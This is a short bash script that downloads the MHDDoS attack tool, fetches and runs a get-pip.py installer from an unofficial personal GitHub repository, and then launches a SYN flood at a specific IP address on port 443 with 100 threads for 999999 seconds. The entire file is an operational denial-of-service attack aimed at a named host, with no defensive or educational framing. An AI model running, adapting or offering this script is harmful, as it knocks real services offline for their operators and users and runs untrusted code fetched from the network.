#!/bin/bash
git clone https://github.com/MatrixTM/MHDDoS.git
wget https://github.com/Chen-Sa/get-pip.py
python3 get-pip.py
cd MHDDoS/
pip install -r requirements.txt
python3 start.py syn 80.96.156.22:443 100 999999
